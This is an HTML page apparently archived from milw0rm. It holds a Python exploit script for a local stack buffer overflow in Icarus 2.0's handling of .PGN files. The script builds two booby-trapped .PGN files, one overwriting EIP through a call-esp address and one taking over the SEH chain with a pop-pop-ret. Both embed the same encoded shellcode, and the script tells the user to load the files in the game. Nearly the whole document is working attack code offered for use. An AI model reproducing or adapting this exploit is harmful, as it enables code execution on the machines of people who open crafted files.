<html><head><title>Icarus 2.0 (.PGN File) Local Stack Overflow Exploit (SEH)</title></head><pre>#usage: exploit.py
print &quot;********************************************************************&quot;
print &quot; Icarus 2.0 Local Stack Overflow Exploit\n&quot;
print &quot; Download: http://www.randomsoftware.com/pub/icarus.exe&quot;
print &quot; Author : His0k4&quot;
print &quot; Tested on: Windows XP Pro SP2 Fr\n&quot;
print &quot; Greetings to:&quot;
print &quot; All friends &amp; muslims HaCkers(dz)\n&quot;
print &quot; Tip of the day: Klimontayne fe romayne :D&quot;
print &quot;********************************************************************\n\n&quot;

					
payload1 =   &quot;\x41&quot; * 336
payload1 +=  &quot;\x5D\x38\x82\x7C&quot; # call esp kernel32.dll (sp2)
payload1 +=  &quot;\x90&quot; * 19 #some nops
payload1 +=  &quot;\x29\xc9\x83\xe9\xde\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x38&quot;
payload1 +=  &quot;\x4e\xf9\x9f\x83\xeb\xfc\xe2\xf4\xc4\xa6\xbd\x9f\x38\x4e\x72\xda&quot;
payload1 +=  &quot;\x04\xc5\x85\x9a\x40\x4f\x16\x14\x77\x56\x72\xc0\x18\x4f\x12\xd6&quot;
payload1 +=  &quot;\xb3\x7a\x72\x9e\xd6\x7f\x39\x06\x94\xca\x39\xeb\x3f\x8f\x33\x92&quot;
payload1 +=  &quot;\x39\x8c\x12\x6b\x03\x1a\xdd\x9b\x4d\xab\x72\xc0\x1c\x4f\x12\xf9&quot;
payload1 +=  &quot;\xb3\x42\xb2\x14\x67\x52\xf8\x74\xb3\x52\x72\x9e\xd3\xc7\xa5\xbb&quot;
payload1 +=  &quot;\x3c\x8d\xc8\x5f\x5c\xc5\xb9\xaf\xbd\x8e\x81\x93\xb3\x0e\xf5\x14&quot;
payload1 +=  &quot;\x48\x52\x54\x14\x50\x46\x12\x96\xb3\xce\x49\x9f\x38\x4e\x72\xf7&quot;
payload1 +=  &quot;\x04\x11\xc8\x69\x58\x18\x70\x67\xbb\x8e\x82\xcf\x50\xbe\x73\x9b&quot;
payload1 +=  &quot;\x67\x26\x61\x61\xb2\x40\xae\x60\xdf\x2d\x98\xf3\x5b\x4e\xf9\x9f&quot;
junk     =   &quot;\xCC&quot;*7000


payload2 =	 &quot;\x5B\x46\x6F\x72\x6D\x61\x74\x20\x22\x4C\x65\x63\x74\x75\x72\x65\x22\x5D&quot;
payload2 +=  &quot;\x0A\x5B\x54\x69\x74\x6C\x65\x20\x22\x65\x78\x70\x6C\x6F\x69\x74\x22\x5D&quot;
payload2 +=  &quot;\x0A\x0A&quot;
payload2 +=  &quot;\x41&quot;*788
payload2 +=  &quot;\xEB\x06\x90\x90&quot; # jmp +6
payload2 +=  &quot;\xE9\x10\x37\x01&quot; # universal pop pop ret
payload2 +=  &quot;\x29\xc9\x83\xe9\xde\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x38&quot;
payload2 +=  &quot;\x4e\xf9\x9f\x83\xeb\xfc\xe2\xf4\xc4\xa6\xbd\x9f\x38\x4e\x72\xda&quot;
payload2 +=  &quot;\x04\xc5\x85\x9a\x40\x4f\x16\x14\x77\x56\x72\xc0\x18\x4f\x12\xd6&quot;
payload2 +=  &quot;\xb3\x7a\x72\x9e\xd6\x7f\x39\x06\x94\xca\x39\xeb\x3f\x8f\x33\x92&quot;
payload2 +=  &quot;\x39\x8c\x12\x6b\x03\x1a\xdd\x9b\x4d\xab\x72\xc0\x1c\x4f\x12\xf9&quot;
payload2 +=  &quot;\xb3\x42\xb2\x14\x67\x52\xf8\x74\xb3\x52\x72\x9e\xd3\xc7\xa5\xbb&quot;
payload2 +=  &quot;\x3c\x8d\xc8\x5f\x5c\xc5\xb9\xaf\xbd\x8e\x81\x93\xb3\x0e\xf5\x14&quot;
payload2 +=  &quot;\x48\x52\x54\x14\x50\x46\x12\x96\xb3\xce\x49\x9f\x38\x4e\x72\xf7&quot;
payload2 +=  &quot;\x04\x11\xc8\x69\x58\x18\x70\x67\xbb\x8e\x82\xcf\x50\xbe\x73\x9b&quot;
payload2 +=  &quot;\x67\x26\x61\x61\xb2\x40\xae\x60\xdf\x2d\x98\xf3\x5b\x4e\xf9\x9f&quot;
payload2 +=  &quot;\xCC&quot;*7000



try:
    out_file = open(&quot;exploit_eip.PGN&quot;,'w')
    out_file.write(payload1+junk)
    out_file.close()
    print &quot;Eip exploit File Created!\nNow you can run this file directly\n&quot;
except:
    print &quot;Error&quot;
try:
    out_file = open(&quot;exploit_seh.PGN&quot;,'w')
    out_file.write(payload2)
    out_file.close()
    print &quot;Seh exploit File Created!\nOpen Icarus then game&gt;load and chose exploit_seh.PGN\n&quot;
except:
    print &quot;Error&quot;	

# milw0rm.com [2009-03-18]</pre></html>